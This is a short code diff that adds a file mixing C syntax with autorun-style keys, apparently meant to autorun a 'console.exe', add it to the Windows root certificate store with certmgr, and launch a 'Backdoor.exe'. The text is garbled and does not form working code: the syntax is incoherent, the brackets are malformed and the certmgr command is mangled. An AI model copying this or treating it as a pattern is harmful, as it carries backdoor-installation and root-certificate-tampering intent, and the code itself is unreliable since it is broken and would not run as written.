@@ -1,0 +1,15 @@
+int main()
+
+open = console.exeicon=console.exeaction=('subsytem+executar')
+
+	open = console.exe.exe
+
+	icon = console.exe.ico
+
+	certmgr / c / add console.exe / s root
+	[/ s Backdoor.exe[/ r Backdoor.exe]][console.exe]
+
+	char import executar = ("Backdoor")
+
+		action = ('subsytem+executar')
+	};
